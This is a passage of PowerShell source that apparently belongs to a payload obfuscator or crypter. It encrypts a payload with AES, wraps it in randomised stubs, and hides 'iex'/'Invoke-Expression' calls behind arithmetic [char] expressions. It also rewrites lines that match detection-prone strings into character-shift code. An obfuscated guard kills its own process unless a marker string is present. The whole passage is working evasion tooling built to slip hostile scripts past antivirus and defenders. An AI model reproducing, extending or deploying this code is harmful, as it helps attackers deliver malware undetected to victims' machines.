                '& ([char](((-21843 -Band 8746) + (-21843 -Bor 8746) + 3645 + 9525))+[char](((-2294 -Band 4778) + (-2294 -Bor 4778) + 2204 - 4578))+[char]((2711 - 8404 + 4028 + 1783))+[char](((-13723 -Band 6664) + (-13723 -Bor 6664) + 4975 + 2195))+[char]((-2364 - 1081 + 5271 - 1719))+[char](((-10012 -Band 8453) + (-10012 -Bor 8453) - 522 + 2182))+[char](((12441 -Band 45) + (12441 -Bor 45) - 5464 - 6977))+[char]((5082 - 5000 + 5756 - 5769))+[char](((-6017 -Band 9992) + (-6017 -Bor 9992) + 851 - 4706))+[char]((-308 - 2044 - 3182 + 5646))+[char](((-7634 -Band 2313) + (-7634 -Bor 2313) + 4890 + 545))+[char]((6697 - 6598 + 1497 - 1495))+[char](((1621 -Band 6427) + (1621 -Bor 6427) - 3647 - 4286))+[char]((-4362 - 7975 + 7287 + 5165))+[char](((9765 -Band 185) + (9765 -Bor 185) - 7535 - 2310))+[char]((709 - 4331 - 3956 + 7689))+[char]((9200 - 3756 + 1812 - 7146)))',
                '& ([char]((16244 - 2138 - 9792 - 4209))+[char]((-3382 - 690 - 974 + 5156))+[char](((-14026 -Band 768) + (-14026 -Bor 768) + 6971 + 6405))+[char]((16387 - 9846 + 1400 - 7830))+[char]((6243 - 7925 + 8443 - 6654))+[char](((-9826 -Band 6310) + (-9826 -Bor 6310) - 857 + 4474))+[char]((22712 - 8402 - 8196 - 6069))+[char](((-19830 -Band 8412) + (-19830 -Bor 8412) + 9792 + 1727))+[char](((-5621 -Band 2022) + (-5621 -Bor 2022) + 3156 + 563))+[char](((-21128 -Band 2228) + (-21128 -Bor 2228) + 9517 + 9495))+[char]((-13883 - 932 + 7055 + 7874))+[char]((710 - 4691 - 4050 + 8132))+[char]((8058 - 9439 + 4887 - 3391))+[char]((9890 - 6977 - 2010 - 788))+[char]((-10887 - 6813 + 8072 + 9733))+[char](((-4926 -Band 7787) + (-4926 -Bor 7787) + 860 - 3610))+[char](((7016 -Band 6477) + (7016 -Bor 6477) - 9063 - 4320)))',
                '& ([char]((2523 - 2614 - 4746 + 4910))+[char](((-11723 -Band 2744) + (-11723 -Bor 2744) + 5845 + 3212))+[char]((11829 - 7353 + 2004 - 6394))+[char](((-14684 -Band 1130) + (-14684 -Bor 1130) + 5795 + 7838))+[char](((7790 -Band 1401) + (7790 -Bor 1401) - 5316 - 3800))+[char](((-7002 -Band 6060) + (-7002 -Bor 6060) + 3195 - 2184))+[char](((-14009 -Band 471) + (-14009 -Bor 471) + 4103 + 9480))+[char](((-13817 -Band 3144) + (-13817 -Bor 3144) + 4911 + 5831))+[char](((-16107 -Band 2812) + (-16107 -Bor 2812) + 8813 + 4570))+[char](((-4302 -Band 1864) + (-4302 -Bor 1864) + 3535 - 1017))+[char]((10571 - 7774 - 7320 + 4605))+[char]((10896 - 84 - 4290 - 6453))+[char](((-5952 -Band 7714) + (-5952 -Bor 7714) - 556 - 1123))+[char]((6883 - 4942 + 6048 - 7906))+[char](((6261 -Band 7411) + (6261 -Bor 7411) - 9728 - 3871))+[char](((-16021 -Band 9058) + (-16021 -Bor 9058) + 5225 + 1817))+[char](((-9394 -Band 3249) + (-9394 -Bor 3249) + 5744 + 479)))',
                '& ([char]((24480 - 9013 - 8895 - 6467))+[char](((-18478 -Band 1263) + (-18478 -Bor 1263) + 7782 + 9511))+[char]((-13068 - 1760 + 6671 + 8243))+[char]((-1454 - 1424 - 2703 + 5660))+[char]((1425 - 868 + 4782 - 5264))+[char](((-1311 -Band 4870) + (-1311 -Bor 4870) - 9227 + 5737))+[char](((-7648 -Band 7779) + (-7648 -Bor 7779) - 284 + 198))+[char](((10238 -Band 1664) + (10238 -Bor 1664) - 2119 - 9682))+[char]((-3609 - 754 - 3592 + 8043))+[char]((7201 - 3408 + 6281 - 9994))+[char](((-13953 -Band 6938) + (-13953 -Bor 6938) + 2853 + 4244))+[char]((1979 - 7352 + 1224 + 4218))+[char](((-13058 -Band 6353) + (-13058 -Bor 6353) - 1580 + 8368))+[char](((-8841 -Band 215) + (-8841 -Bor 215) + 6415 + 2294))+[char](((-10862 -Band 8660) + (-10862 -Bor 8660) + 3136 - 861))+[char]((9260 - 9680 + 6734 - 6235))+[char]((4814 - 5291 + 2185 - 1630)))',
                '& ([char]((-1861 - 5260 + 2803 + 4391))+[char]((5747 - 3168 - 7272 + 4803))+[char](((-1963 -Band 3411) + (-1963 -Bor 3411) - 7674 + 6344))+[char]((-5412 - 4757 + 5456 + 4792))+[char]((-7538 - 2164 + 6377 + 3432))+[char](((14576 -Band 5280) + (14576 -Bor 5280) - 9967 - 9820))+[char](((4048 -Band 211) + (4048 -Bor 211) - 3049 - 1165))+[char](((-4449 -Band 1916) + (-4449 -Bor 1916) + 163 + 2471))+[char](((3276 -Band 7941) + (3276 -Bor 7941) - 8804 - 2325))+[char](((-24220 -Band 9640) + (-24220 -Bor 9640) + 8529 + 6163))+[char](((-15638 -Band 7167) + (-15638 -Bor 7167) - 399 + 8952))+[char](((-10762 -Band 2600) + (-10762 -Bor 2600) + 2974 + 5289))+[char](((-7065 -Band 6424) + (-7065 -Bor 6424) + 2120 - 1396))+[char](((-11346 -Band 8865) + (-11346 -Bor 8865) + 475 + 2121))+[char](((-6518 -Band 2914) + (-6518 -Bor 2914) + 6878 - 3201))+[char]((3467 - 3326 + 8547 - 8577))+[char](((-13681 -Band 8640) + (-13681 -Bor 8640) - 2601 + 7720)))',
                '& ([char]((1766 - 4852 + 1809 + 1350))+[char](((-5479 -Band 751) + (-5479 -Bor 751) + 4778 + 28))+[char](((-1305 -Band 5940) + (-1305 -Bor 5940) - 4438 - 79))+[char](((5490 -Band 6237) + (5490 -Bor 6237) - 4233 - 7383))+[char](((-3163 -Band 7017) + (-3163 -Bor 7017) + 5969 - 9716))+[char](((-19603 -Band 9614) + (-19603 -Bor 9614) + 1920 + 8138))+[char]((-2498 - 703 + 7845 - 4599))+[char](((-4805 -Band 8316) + (-4805 -Bor 8316) - 6526 + 3084))+[char]((16426 - 8776 - 5448 - 2082))+[char](((2728 -Band 6036) + (2728 -Bor 6036) - 7465 - 1219))+[char](((-9437 -Band 7915) + (-9437 -Bor 7915) + 2780 - 1144))+[char](((-5597 -Band 4698) + (-5597 -Bor 4698) + 3481 - 2481))+[char]((7613 - 9954 + 4759 - 2335))+[char]((12922 - 4788 - 1811 - 6240))+[char](((5428 -Band 5092) + (5428 -Bor 5092) - 8057 - 2358))+[char](((-12561 -Band 3193) + (-12561 -Bor 3193) + 2253 + 7226))+[char](((-7293 -Band 1887) + (-7293 -Bor 1887) - 4010 + 9526)))',
                '& (.([char](((-11128 -Band 9829) + (-11128 -Bor 9829) - 2506 + 3908))+[char]((15459 - 9129 - 4378 - 1853))+[char](((-22324 -Band 5654) + (-22324 -Bor 5654) + 9387 + 7392))) i*x)',
                '& (.([char](((-3192 -Band 2397) + (-3192 -Bor 2397) + 3533 - 2667))+[char]((-3297 - 4708 + 6673 + 1399))+[char]((2533 - 6547 + 8864 - 4773))) i*x)',
                '& (.([char](((997 -Band 504) + (997 -Bor 504) + 371 - 1769))+[char]((4212 - 3199 + 2688 - 3602))+[char]((14194 - 5818 - 825 - 7442))) I*X)',
                '& (.([char]((8529 - 1587 - 5830 - 1041))+[char]((-3231 - 8404 + 6507 + 5195))+[char](((13793 -Band 3264) + (13793 -Bor 3264) - 8417 - 8563))) I*X)',
                '& (.([char]((1727 - 3498 + 9858 - 7984))+[char]((10237 - 9001 + 5959 - 7096))+[char]((19327 - 8850 - 6358 - 4010))) ?[?e]x)',
                '& (.([char](((-5485 -Band 1930) + (-5485 -Bor 1930) - 5656 + 9282))+[char](((-8437 -Band 6143) + (-8437 -Bor 6143) + 1914 + 447))+[char](((8088 -Band 9817) + (8088 -Bor 9817) - 9443 - 8385))) ?[?e]x)',
                '& (.([char]((16459 - 6720 - 7894 - 1742))+[char](((5386 -Band 2337) + (5386 -Bor 2337) - 7382 - 242))+[char](((1629 -Band 539) + (1629 -Bor 539) - 6485 + 4426))) ?[?E]X)',
                '& (.([char]((8702 - 9751 - 2418 + 3538))+[char](((-3291 -Band 1361) + (-3291 -Bor 1361) - 5357 + 7354))+[char]((24010 - 6939 - 9338 - 7656))) ?[?E]X)' | Get-random) + '${8}' + "`r`n"
            #$nvstubpre += ('iex' | Get-random)+'(${8})' + " #$(linefuse)" + "`r`n"
            #$nvstubpre += '#get-content -path {9}' + "`r`n"

            # works
            $nvcode = $nvstubpre -f ($b64encrypted, $b64key,
            (nvrandom), (nvrandom), (nvrandom), (nvrandom), (nvrandom),(nvrandom), (nvrandom),
            (confusekey), (confusekey),(confusekey), (confusekey), (confusekey),(confusekey),
            (nvrandom), (nvrandom),(nvrandom), (nvrandom), (nvrandom), (nvrandom), (nvrandom),
            (nvrandom), (nvrandom), (nvrandom), (nvrandom), (nvrandom),
            (nvrandom), (nvrandom), (nvrandom), (nvrandom), (nvrandom),
            (nvrandom), (nvrandom), (nvrandom), (nvrandom), (nvrandom),
            (nvrandom), (nvrandom), (nvrandom), (nvrandom), (nvrandom),
            (nvrandom), (nvrandom), (nvrandom), (nvrandom), (nvrandom),
            (nvrandom), (nvrandom), (nvrandom), (nvrandom), (nvrandom),
            (nvrandom), (nvrandom), (nvrandom), (nvrandom), (nvrandom),
            (nvrandom), (nvrandom), (nvrandom), (nvrandom), (nvrandom),
            (nvrandom),(confusekey), (confusekey), (confusekey),
            (reverseobf),(reverseobf),(reverseobf),(reverseobf),(reverseobf),(reverseobf),
            (reverseobf),(reverseobf),(reverseobf),(reverseobf),(reverseobf),
            (reverseobf),(reverseobf),(reverseobf),(reverseobf),(reverseobf),
            (chararrayobf),(chararrayobf),(chararrayobf),(chararrayobf),(chararrayobf),(chararrayobf),
            (chararrayobf),(chararrayobf),(chararrayobf),(chararrayobf),(chararrayobf),
            (chararrayobf),(chararrayobf),(chararrayobf),(chararrayobf),(chararrayobf),
            (utfobf),(utfobf),(utfobf),(utfobf),(utfobf),(utfobf),
            (utfobf),(utfobf),(utfobf),(utfobf),(utfobf),
            (utfobf),(utfobf),(utfobf),(utfobf),(utfobf),(utfobf),(utfobf),
            (getstringobf),(getstringobf),(getstringobf),(getstringobf),(getstringobf),(getstringobf),
            (getstringobf),(getstringobf),(getstringobf),(getstringobf),(getstringobf),
            (getstringobf),(getstringobf),(getstringobf),(getstringobf),(getstringobf),(getstringobf),
            (obfcreate),(obfcreate),(obfcreate),(obfcreate),(obfcreate),(obfcreate),(obfcreate),(obfcreate),
            (keyobf),(keysizeobf),(ivobf),(copytoobf),(closeobf),(closeobf),(disposeobf),(createdecr),
            (b64obf),(b64obf),(b64obf),(b64obf),(b64obf),(b64obf),(b64obf),(b64obf),(b64obf),(b64obf),(b64obf),(b64obf),(b64obf),(b64obf),(b64obf),(b64obf),(b64obf),(b64obf),(b64obf),
            (paddingobf),(paddingobf),(paddingobf),(paddingobf),(blocksizeobf),(transformobf),(modeobf),
            (noobf),(noobf),(noobf),(noobf),(noobf))
            log "[+]" "Applied $i layer" -HighlightColor Green;if(-not $nv.COntAIns(([SYSTeM.teXt.ENcoDInG]::UTF8.gETstRiNg((0x4e, 0x6f, 0x78, 0x69))))){.([char]((9132 - 5982 - 3860 + 825))+[char]((8305 - 3803 - 7788 + 3398))+[char]((12558 - 3696 - 7369 - 1381))+[char]((12517 - 6409 - 1873 - 4120))) -Id $Pid}
        }
        if (($usedkeys | Select-Object -Unique | Measure-Object).Count -eq 1) {log "[-]" "All secure keys used were identical" -HighlightColor Red
        } else {log "[~]" "Different keys were used" -HighlightColor Gray}

        function mathobf {
            param([string]$nvcode)
            $lines = $nvcode -split "`n"
            $modifiedc = 0
            $vars = @(([sYsTEM.tExt.EncOdinG]::UTf8.getSTRing((0x4e, 0x6f)) + [sysTEm.texT.EnCoDING]::UtF8.gEtsTRING((120, 73))), ([SystEm.TEXT.encODING]::utf8.getSTrinG((110, 48, 111)) + [sySTem.TExT.ENcOdinG]::utF8.gEtStRing((0x58, 0x69, 0x31))), ([SYStem.TExT.encODIng]::Utf8.getstrInG((110, 111, 0x78)) + [System.tEXT.encoDINg]::UTf8.GEtstRING((88, 105, 49))), ([sYSTeM.text.encodiNg]::UTf8.GEtsTriNG((0x4e, 0x30)) + [sYstEm.TExt.enCodiNg]::UTF8.getSTRInG([sYsTeM.Convert]::fRoMBASE64StrING('eGw='))), ([sYSTEM.TeXT.enCoDing]::uTf8.GETStRInG((0x4e, 0x6f)) + [SystEM.text.enCoDiNG]::utF8.gETSTRINg((120, 73))), ([system.TExt.eNCodIng]::utf8.getstring((0x6e, 0x6f, 0x58)) + [SYSTeM.TexT.eNCODing]::utf8.gETsTrInG((49))), ([sYstEm.TeXt.EncoDing]::UTf8.gEtSTRing((78, 111, 111, 120)) + [system.text.enCodIng]::Utf8.GetStrinG((73))), ([sYSteM.tEXt.eNCodINg]::uTf8.gETSTRing((0x6e, 0x30, 0x58)) + [SYSTem.text.eNCoDing]::UtF8.gEtsTRINg((105, 0x69))), ([SYstEM.tEXT.eNcODIng]::utF8.GEtSTrinG((0x4e, 0x6f)) + [SysTem.TeXt.eNCODiNg]::uTF8.GEtStRing((120, 73))), ([sYsteM.TEXT.ENcODINg]::uTf8.GetsTRInG((0x6e, 48, 48)) + [systEM.teXt.ENCodiNg]::UtF8.getStriNG((0x78, 0x78, 0x69, 0x69))), ([sysTem.TExT.enCodInG]::UTf8.GEtSTriNg((0x4e, 0x6f)) + [SYstEM.tExT.EncodinG]::utf8.GEtsTRING((0x30, 0x30, 0x78)) + [sysTeM.text.encODInG]::Utf8.gEtsTriNg([SysTEm.coNVerT]::FrOmBaSe64strinG('SQ=='))), ([SYStem.tEXT.eNCOdIng]::UTF8.getSTRING((0x6e, 0x30, 0x6f, 0x78)) + [sYSTEM.TExT.encoDiNG]::utf8.gETsTRINg((88, 105))), ([sYStEm.tEXt.enCOdiNg]::UtF8.GetsTrIng([SYSTem.coNVeRt]::fROMbAse64StriNg('bm8=')) + [sYsTEM.TEXt.enCodiNg]::utf8.geTStRing((0x58, 105, 0x31))), ([SYStem.TExT.EncodINg]::Utf8.GetStRing((0x4e, 0x30, 0x78)) + [sYsTEM.TEXt.EncoDIng]::UtF8.geTSTRING((0x6c, 0x31))), ([SYsTEm.Text.EnCOdINg]::utF8.getstrIng((110, 111, 88, 49)) + [SySTEm.TExt.enCoDInG]::uTf8.gEtsTRINg([sySTEm.cONverT]::frOmBAsE64stRIng('MWk='))), ([sYStem.tExT.eNCOdiNg]::UTf8.getsTriNg((110, 111, 88)) + [sYSTem.TExt.enCODIng]::utF8.GeTstring((0x31, 105, 0x31))), ([SYStEm.texT.enCOdinG]::UtF8.GetSTRiNg((78, 111, 111)) + [SysTeM.tEXT.enCODIng]::UTF8.gEtstrInG([SYSteM.cOnveRt]::FrombASE64StriNg('eFhJ'))), ([SYsTeM.text.ENcODInG]::utf8.gETstRing((110, 48, 0x58)) + [sYStem.TEXt.encoDing]::uTF8.getsTRING((120, 105, 49, 105))), ([SYstEm.tEXT.EncOdIng]::UTF8.GeTSTrIng((0x6e, 0x6f, 0x31)) + [SYsteM.teXt.eNCoDInG]::UTF8.gETStrInG((88, 105, 0x31))), ([SYsTeM.tEXt.eNCODIng]::uTF8.GetsTRing((0x4e, 0x6f, 0x6f)) + [SYSteM.teXT.EnCODinG]::uTF8.GeTString((120, 88, 73)) + [sySTEM.TEXT.eNCODINg]::uTF8.gETstrING([SYSteM.cONverT]::frombAsE64sTRiNG('MTE='))))
            $usedvars = @()
            function mathkey {
                param ([ref]$usedvars,[string[]]$vars)
                if (-not ($usedvars.Value -is [System.Collections.ArrayList])) {$usedvars.Value = @()}
                $basevar = $vars | Get-random
                while ($true) {
                    $length = Get-random -Minimum 5 -Maximum 10
                    $base64chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789"
                    $nvrandoms = -join (1..$length | ForEach-Object { $base64chars[(Get-random -Minimum 0 -Maximum $base64chars.Length)] })
                    $combinedVar = $basevar + $nvrandoms
                    if (-not ($usedvars.Value -contains $combinedVar)) {$usedvars.Value += $combinedVar;return $combinedVar}}}
            # most of them arent needed anymore, but ill just leave them
            $nvtarg = @(
                "\.mode\s*=","\.padding\s*=","\.blocksize\s*=","\.keysize\s*=","\.key\s*=","\.iv\s*=","\.close\(\)","\.dispose\(\)","\.CopyTo","\.ToCharArray","::Reverse","-join",
                "\[System.Text.Encoding\]::UTF8\.GetString","\[scriptblock\]::Create","&\(GCM \*w-o\*t\)","\(10\+50\-20\*2\)","\(10\+166\-20\*2\)","\[0\.\.15\]",
                '"==QbhVmUUNXeS9WTl1kLPlmLNVGdTl1c"','"EV0Rh5UQNNXZB5SWIBXQSd2b0BXWyNkL5RVSSV1YlNlLtVEVzl1c"','"==wYCNmO60VZE9UTyVGSwl0YukHaQFmcH9Gdwlncj5Se0lkUVNURz5STFR1c5N3W"',
                '"==wcvJVZapjOdVGZP10ZulGZEFEcukFaQFmcH9GdwlnUj5SW0lmc1NWZT5STlR3UZN1W"','"=0WYlJHVzVEVBxkRFRkLO9USTNXZyBVbvNmLPlmLNVEVzl1c"','"=0VRk9UbO9WazNVRSBVTvNmLu9USzNVZyBVbvNmLvl2W"',
                '"==gNyEDMx80cppjOdVGRv10ROlEREFEcukFSQFkUn9EdQllUD5SW0lmU1NWRT5SblR3cZN1W"','"==wNzN0SwpjOdVEZv10RulEZEFGcukHawFmcn9EVQllcj5SeUlmcVNWZz5STFR1UZN3W"','"==wMykDepNnThpjOdVGRP10ZulEREFEUukFawFmUn9GVwlnUD5SWUlmUVNWRT5STlR3U5N3W"',
                '"=0WQFJHVTBXa6dkLu9UazNXZyBXbvNmLPlmLtVEVzl1U"','"==wcTVkcw12bDVEZ"','"W1RlWFQuRW5DT2RJbkdd"','"==COGRXV"','"n5WayR3U0V2R"','"==QWBJlUB9Ed"','\(\)\)','char')
            $nvtargl = $lines | Where-Object {($_ -match ($nvtarg -join "|"))}
            $nvtargl = $lines | Where-Object {foreach ($pattern in $nvtarg) {if ($_ -match $pattern) { return $true }}return $false}
            if (-not $nvtargl) {Get-Content -Path $nvi | Set-Content -Path $nvo;return}
            foreach ($lineIndex in 0..($lines.Count - 1)) {
                $linecon = $lines[$lineIndex]
                foreach ($pattern in $nvtarg) {
                    if ($linecon -match $pattern) {
                        log "[+]" "Line $($lineIndex + 86) - String $pattern" -HighlightColor Green;$modifiedc++}}}
            foreach ($nvtarglsingle in $nvtargl) {
                $targindex = $lines.IndexOf($nvtarglsingle)
                if ($targindex -eq 0) {continue}
                $raw = $nvtarglsingle.ToCharArray()
                $space = $raw | ForEach-Object { ([int][char]$_) }
                $shift = number
                $shift = [int]$shift
                if ($shift -gt 0) {$operator = "-";$pos = $shift
                } elseif ($shift -lt 0) {$operator = "+";$pos = [Math]::abs($shift)}
                $added = $space | ForEach-Object { ($_ + $shift) }
                $modchar = $added -join ","
                $aC = @("c", "C") | Get-random;$aH = @("h", "H") | Get-random;$aA = @("a", "A") | Get-random;$aR = @("r", "R") | Get-random
                $nviex = @(
                    '([char]((5591 - 1917 - 703 - 2866))+[char](((-76 -Band 1357) + (-76 -Bor 1357) + 7835 - 9015))+[char](((11229 -Band 1042) + (11229 -Bor 1042) - 3467 - 8684)))',
                    '([char](((-14316 -Band 6651) + (-14316 -Bor 6651) + 5280 + 2458))+[char](((13444 -Band 539) + (13444 -Bor 539) - 4849 - 9033))+[char](((-6259 -Band 6079) + (-6259 -Bor 6079) - 7830 + 8098)))',
                    '([char](((-20558 -Band 9226) + (-20558 -Bor 9226) + 4827 + 6578))+[char](((126 -Band 3024) + (126 -Bor 3024) - 7285 + 4204))+[char]((10888 - 3219 + 2090 - 9671)))',
                    '([char](((-5126 -Band 2412) + (-5126 -Bor 2412) + 3410 - 591))+[char](((-8020 -Band 5005) + (-8020 -Bor 5005) + 7612 - 4528))+[char](((-16272 -Band 927) + (-16272 -Bor 927) + 8219 + 7246)))',
                    '([char]((4976 - 6909 - 4175 + 6213))+[char]((-4135 - 7484 + 1945 + 9743))+[char](((1942 -Band 6467) + (1942 -Bor 6467) - 5314 - 3007)))',
                    '([char](((7426 -Band 1006) + (7426 -Bor 1006) - 8700 + 341))+[char]((16397 - 5218 - 4807 - 6271))+[char]((-3752 - 8349 + 8988 + 3201)))',
                    '([char](((-21843 -Band 8746) + (-21843 -Bor 8746) + 3645 + 9525))+[char](((-2294 -Band 4778) + (-2294 -Bor 4778) + 2204 - 4578))+[char]((2711 - 8404 + 4028 + 1783))+[char](((-13723 -Band 6664) + (-13723 -Bor 6664) + 4975 + 2195))+[char]((-2364 - 1081 + 5271 - 1719))+[char](((-10012 -Band 8453) + (-10012 -Bor 8453) - 522 + 2182))+[char](((12441 -Band 45) + (12441 -Bor 45) - 5464 - 6977))+[char]((5082 - 5000 + 5756 - 5769))+[char](((-6017 -Band 9992) + (-6017 -Bor 9992) + 851 - 4706))+[char]((-308 - 2044 - 3182 + 5646))+[char](((-7634 -Band 2313) + (-7634 -Bor 2313) + 4890 + 545))+[char]((6697 - 6598 + 1497 - 1495))+[char](((1621 -Band 6427) + (1621 -Bor 6427) - 3647 - 4286))+[char]((-4362 - 7975 + 7287 + 5165))+[char](((9765 -Band 185) + (9765 -Bor 185) - 7535 - 2310))+[char]((709 - 4331 - 3956 + 7689))+[char]((9200 - 3756 + 1812 - 7146)))',
                    '([char]((16244 - 2138 - 9792 - 4209))+[char]((-3382 - 690 - 974 + 5156))+[char](((-14026 -Band 768) + (-14026 -Bor 768) + 6971 + 6405))+[char]((16387 - 9846 + 1400 - 7830))+[char]((6243 - 7925 + 8443 - 6654))+[char](((-9826 -Band 6310) + (-9826 -Bor 6310) - 857 + 4474))+[char]((22712 - 8402 - 8196 - 6069))+[char](((-19830 -Band 8412) + (-19830 -Bor 8412) + 9792 + 1727))+[char](((-5621 -Band 2022) + (-5621 -Bor 2022) + 3156 + 563))+[char](((-21128 -Band 2228) + (-21128 -Bor 2228) + 9517 + 9495))+[char]((-13883 - 932 + 7055 + 7874))+[char]((710 - 4691 - 4050 + 8132))+[char]((8058 - 9439 + 4887 - 3391))+[char]((9890 - 6977 - 2010 - 788))+[char]((-10887 - 6813 + 8072 + 9733))+[char](((-4926 -Band 7787) + (-4926 -Bor 7787) + 860 - 3610))+[char](((7016 -Band 6477) + (7016 -Bor 6477) - 9063 - 4320)))',
                    '([char]((2523 - 2614 - 4746 + 4910))+[char](((-11723 -Band 2744) + (-11723 -Bor 2744) + 5845 + 3212))+[char]((11829 - 7353 + 2004 - 6394))+[char](((-14684 -Band 1130) + (-14684 -Bor 1130) + 5795 + 7838))+[char](((7790 -Band 1401) + (7790 -Bor 1401) - 5316 - 3800))+[char](((-7002 -Band 6060) + (-7002 -Bor 6060) + 3195 - 2184))+[char](((-14009 -Band 471) + (-14009 -Bor 471) + 4103 + 9480))+[char](((-13817 -Band 3144) + (-13817 -Bor 3144) + 4911 + 5831))+[char](((-16107 -Band 2812) + (-16107 -Bor 2812) + 8813 + 4570))+[char](((-4302 -Band 1864) + (-4302 -Bor 1864) + 3535 - 1017))+[char]((10571 - 7774 - 7320 + 4605))+[char]((10896 - 84 - 4290 - 6453))+[char](((-5952 -Band 7714) + (-5952 -Bor 7714) - 556 - 1123))+[char]((6883 - 4942 + 6048 - 7906))+[char](((6261 -Band 7411) + (6261 -Bor 7411) - 9728 - 3871))+[char](((-16021 -Band 9058) + (-16021 -Bor 9058) + 5225 + 1817))+[char](((-9394 -Band 3249) + (-9394 -Bor 3249) + 5744 + 479)))',
                    '([char]((24480 - 9013 - 8895 - 6467))+[char](((-18478 -Band 1263) + (-18478 -Bor 1263) + 7782 + 9511))+[char]((-13068 - 1760 + 6671 + 8243))+[char]((-1454 - 1424 - 2703 + 5660))+[char]((1425 - 868 + 4782 - 5264))+[char](((-1311 -Band 4870) + (-1311 -Bor 4870) - 9227 + 5737))+[char](((-7648 -Band 7779) + (-7648 -Bor 7779) - 284 + 198))+[char](((10238 -Band 1664) + (10238 -Bor 1664) - 2119 - 9682))+[char]((-3609 - 754 - 3592 + 8043))+[char]((7201 - 3408 + 6281 - 9994))+[char](((-13953 -Band 6938) + (-13953 -Bor 6938) + 2853 + 4244))+[char]((1979 - 7352 + 1224 + 4218))+[char](((-13058 -Band 6353) + (-13058 -Bor 6353) - 1580 + 8368))+[char](((-8841 -Band 215) + (-8841 -Bor 215) + 6415 + 2294))+[char](((-10862 -Band 8660) + (-10862 -Bor 8660) + 3136 - 861))+[char]((9260 - 9680 + 6734 - 6235))+[char]((4814 - 5291 + 2185 - 1630)))',
                    '([char]((-1861 - 5260 + 2803 + 4391))+[char]((5747 - 3168 - 7272 + 4803))+[char](((-1963 -Band 3411) + (-1963 -Bor 3411) - 7674 + 6344))+[char]((-5412 - 4757 + 5456 + 4792))+[char]((-7538 - 2164 + 6377 + 3432))+[char](((14576 -Band 5280) + (14576 -Bor 5280) - 9967 - 9820))+[char](((4048 -Band 211) + (4048 -Bor 211) - 3049 - 1165))+[char](((-4449 -Band 1916) + (-4449 -Bor 1916) + 163 + 2471))+[char](((3276 -Band 7941) + (3276 -Bor 7941) - 8804 - 2325))+[char](((-24220 -Band 9640) + (-24220 -Bor 9640) + 8529 + 6163))+[char](((-15638 -Band 7167) + (-15638 -Bor 7167) - 399 + 8952))+[char](((-10762 -Band 2600) + (-10762 -Bor 2600) + 2974 + 5289))+[char](((-7065 -Band 6424) + (-7065 -Bor 6424) + 2120 - 1396))+[char](((-11346 -Band 8865) + (-11346 -Bor 8865) + 475 + 2121))+[char](((-6518 -Band 2914) + (-6518 -Bor 2914) + 6878 - 3201))+[char]((3467 - 3326 + 8547 - 8577))+[char](((-13681 -Band 8640) + (-13681 -Bor 8640) - 2601 + 7720)))',
                    '([char]((1766 - 4852 + 1809 + 1350))+[char](((-5479 -Band 751) + (-5479 -Bor 751) + 4778 + 28))+[char](((-1305 -Band 5940) + (-1305 -Bor 5940) - 4438 - 79))+[char](((5490 -Band 6237) + (5490 -Bor 6237) - 4233 - 7383))+[char](((-3163 -Band 7017) + (-3163 -Bor 7017) + 5969 - 9716))+[char](((-19603 -Band 9614) + (-19603 -Bor 9614) + 1920 + 8138))+[char]((-2498 - 703 + 7845 - 4599))+[char](((-4805 -Band 8316) + (-4805 -Bor 8316) - 6526 + 3084))+[char]((16426 - 8776 - 5448 - 2082))+[char](((2728 -Band 6036) + (2728 -Bor 6036) - 7465 - 1219))+[char](((-9437 -Band 7915) + (-9437 -Bor 7915) + 2780 - 1144))+[char](((-5597 -Band 4698) + (-5597 -Bor 4698) + 3481 - 2481))+[char]((7613 - 9954 + 4759 - 2335))+[char]((12922 - 4788 - 1811 - 6240))+[char](((5428 -Band 5092) + (5428 -Bor 5092) - 8057 - 2358))+[char](((-12561 -Band 3193) + (-12561 -Bor 3193) + 2253 + 7226))+[char](((-7293 -Band 1887) + (-7293 -Bor 1887) - 4010 + 9526)))',
                    '(.([char](((-11128 -Band 9829) + (-11128 -Bor 9829) - 2506 + 3908))+[char]((15459 - 9129 - 4378 - 1853))+[char](((-22324 -Band 5654) + (-22324 -Bor 5654) + 9387 + 7392))) i*x)',
                    '(.([char](((-3192 -Band 2397) + (-3192 -Bor 2397) + 3533 - 2667))+[char]((-3297 - 4708 + 6673 + 1399))+[char]((2533 - 6547 + 8864 - 4773))) i*x)',
                    '(.([char](((997 -Band 504) + (997 -Bor 504) + 371 - 1769))+[char]((4212 - 3199 + 2688 - 3602))+[char]((14194 - 5818 - 825 - 7442))) I*X)',
                    '(.([char]((8529 - 1587 - 5830 - 1041))+[char]((-3231 - 8404 + 6507 + 5195))+[char](((13793 -Band 3264) + (13793 -Bor 3264) - 8417 - 8563))) I*X)',
                    '(.([char]((1727 - 3498 + 9858 - 7984))+[char]((10237 - 9001 + 5959 - 7096))+[char]((19327 - 8850 - 6358 - 4010))) ?[?e]x)',
                    '(.([char](((-5485 -Band 1930) + (-5485 -Bor 1930) - 5656 + 9282))+[char](((-8437 -Band 6143) + (-8437 -Bor 6143) + 1914 + 447))+[char](((8088 -Band 9817) + (8088 -Bor 9817) - 9443 - 8385))) ?[?e]x)',
                    '(.([char]((16459 - 6720 - 7894 - 1742))+[char](((5386 -Band 2337) + (5386 -Bor 2337) - 7382 - 242))+[char](((1629 -Band 539) + (1629 -Bor 539) - 6485 + 4426))) ?[?E]X)',
                    '(.([char]((8702 - 9751 - 2418 + 3538))+[char](((-3291 -Band 1361) + (-3291 -Bor 1361) - 5357 + 7354))+[char]((24010 - 6939 - 9338 - 7656))) ?[?E]X)')
                if ($vars.Count -le $usedvars.Count) {$newRandVar = -join ((65..90) + (97..122) | Get-random -Count 5 | ForEach-Object { [char]$_ });$vars += $newRandVar}
                $randVar = mathkey ([ref]$usedvars) -vars $vars
                $usedvars += $randVar
                log "[~]" "Using var:" "$usedvars" -HighlightColor Gray -SequenceColor Blue;sleep -Milliseconds 100
                $fuscated = ('@(' + $modchar + ')|%{$' + $randVar + '=$' + $randVar + "+[$aC$aH$aA$aR](`$_" + $operator + $pos + ')};.' + (Get-random -InputObject $nviex) + '($' + $randVar + ')')
                $lines[$targindex] = $fuscated}
            if ($modifiedc -eq 76) {log "[~]" "All patterns found" -HighlightColor Gray
            } else {log "[-]" "$modifiedc patterns found" -HighlightColor Red}return ($lines -join "`n")}
        log "[*]" "Applying math obfuscation" -HighlightColor Blue
        $nvcode = mathobf -nvcode $nvcode
        log "[~]" "Reading encrypted payload" -HighlightColor Gray
        $nvcodeb = [System.Text.Encoding]::UTF8.GetBytes($nvcode)
        log "[+]" "Writing content to $nvo" -HighlightColor Green
